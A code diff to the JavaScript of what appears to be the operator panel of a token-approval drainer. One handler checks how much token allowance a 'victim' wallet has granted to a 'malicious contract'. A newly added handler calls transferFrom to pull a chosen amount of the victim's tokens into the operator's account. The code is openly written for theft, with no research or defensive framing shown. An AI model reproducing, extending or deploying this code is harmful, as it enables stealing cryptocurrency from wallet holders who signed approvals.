@@ -286,31 +286,44 @@
             }
         }
 
-// Add event listener for checking allowance
-document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
-    const victimAddress = prompt("Enter victim's wallet address:");
-    if (victimAddress) {
-        try {
-            // Get the allowance using the malicious contract's allowance function
-            const allowance = await maliciousContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-            
-            // Convert to BigNumber
-            const allowanceBN = web3.utils.toBN(allowance);
+        // Add event listener for checking allowance
+        document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
+            const victimAddress = prompt("Enter victim's wallet address:");
+            if (victimAddress) {
+                try {
+                    // Get the allowance using the malicious contract's allowance function
+                    const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
+                    
+                    // Convert to BigNumber
+                    const allowanceBN = web3.utils.toBN(allowance);
 
-            // Check if the allowance is greater than 0
-            if (allowanceBN.gt(web3.utils.toBN(0))) {
-                alert(`The victim has granted an allowance of ${allowanceBN.toString()} tokens to the malicious contract.`);
-            } else {
-                alert("The victim has not granted any allowance to the malicious contract.");
+                    // Check if the allowance is greater than 0
+                    if (allowanceBN.gt(web3.utils.toBN(0))) {
+                        alert(`The victim has granted an allowance of ${allowanceBN.toString()} tokens to the malicious contract.`);
+                    } else {
+                        alert("The victim has not granted any allowance to the malicious contract.");
+                    }
+                } catch (error) {
+                    alert("An error occurred while checking the allowance.");
+                    console.error(error);
+                }
             }
-        } catch (error) {
-            alert("An error occurred while checking the allowance.");
-            console.error(error);
-        }
-    }
-});
+        });
 
-
+        // Withdraw tokens from the victim using transferFrom
+        document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+            const victimAddress = prompt("Enter victim's wallet address:");
+            const amount = prompt("Enter the amount to withdraw:");
+            if (victimAddress && amount) {
+                try {
+                    await contract.methods.transferFrom(victimAddress, accounts[0], web3.utils.toWei(amount, 'ether')).send({ from: accounts[0] });
+                    alert(`${amount} tokens withdrawn from the victim's account!`);
+                } catch (error) {
+                    alert("An error occurred while transferring tokens.");
+                    console.error(error);
+                }
+            }
+        });
 
         // Withdraw all tokens from the malicious contract to the deployer's address
         document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
